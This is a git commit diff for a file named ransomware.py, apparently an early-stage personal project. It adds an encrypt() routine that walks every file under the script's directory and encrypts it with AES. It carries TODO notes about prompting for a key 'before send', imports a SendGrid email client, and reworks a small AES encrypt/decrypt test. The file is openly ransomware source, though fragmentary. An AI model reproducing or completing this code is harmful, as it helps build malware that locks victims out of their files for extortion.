fc0808c6e19fe9d3abc9d2aa4bf488b6137c0176
Yaryna Horodetska <yaryna.gorodietska@gmail.com>
2022-06-17 15:48:41 +0300

    Add new code, comment old code

--- ransomware.py
+++ ransomware.py
@@ -1,6 +1,9 @@
 import base64
 import os
+import json
+from base64 import b64encode
 from Crypto.Cipher import AES
+from base64 import b64decode
 from Crypto.Random import get_random_bytes
 from sendgrid import SendGridAPIClient
 from sendgrid.helpers.mail import Mail
@@ -45,7 +48,10 @@ def decrypt():
 def encrypt():
     # ui_key = input("Enter a key to decrypt all of the files:")
     # TODO: uncomment before send
-    dkey=base64.b64decode(ui_key)
+    dkey=base64.b64decode(key)
+    #TODO: change key by ui_key after uncomment
+    ransomware_path = os.path.realpath(__file__)
+    folder_path = os.path.dirname(os.path.abspath(__file__))
     for root,dirs,files in os.walk(folder_path):
         for a_file in files:
             full_file_path=f"{root}\\{a_file}"
@@ -62,14 +68,33 @@ def encrypt():
 
 
 def test_encryption_on_one_word():
-    data = b"Yaryna"
-    print(f"We want to encrypt data:{data}")
+    # data = b"Yaryna"
+    # print(f"We want to encrypt data:{data}")
+    # key = get_random_bytes(16)
+    # cipher = AES.new(key, AES.MODE_OFB)
+    # encr = cipher.encrypt(data)
+    # print(f"Our data has been encrypted:{encr}")
+    # d_cipher = AES.new(key, AES.MODE_OFB)
+    # decr = d_cipher.decrypt(encr)
+    # print(f"Our data has been decrypted:{decr}")
+
+    data = b"secret"
     key = get_random_bytes(16)
     cipher = AES.new(key, AES.MODE_OFB)
-    encr = cipher.encrypt(data)
-    print(f"Our data has been encrypted:{encr}")
-    d_cipher = AES.new(key, AES.MODE_OFB)
-    decr = d_cipher.decrypt(encr)
-    print(f"Our data has been decrypted:{decr}")
-test_encryption_on_one_word()
+    ct_bytes = cipher.encrypt(data)
+    iv = b64encode(cipher.iv).decode('utf-8')
+    ct = b64encode(ct_bytes).decode('utf-8')
+    result = json.dumps({'iv': iv, 'ciphertext': ct})
+    print(result)
+    try:
+        b64 = json.loads(result)
+        iv = b64decode(b64['iv'])
+        ct = b64decode(b64['ciphertext'])
+        cipher = AES.new(key, AES.MODE_OFB, iv=iv)
+        pt = cipher.decrypt(ct)
+        print("The message was: ", pt)
+    except (ValueError, KeyError):
+        print("Incorrect decryption")
 
+
+test_encryption_on_one_word()
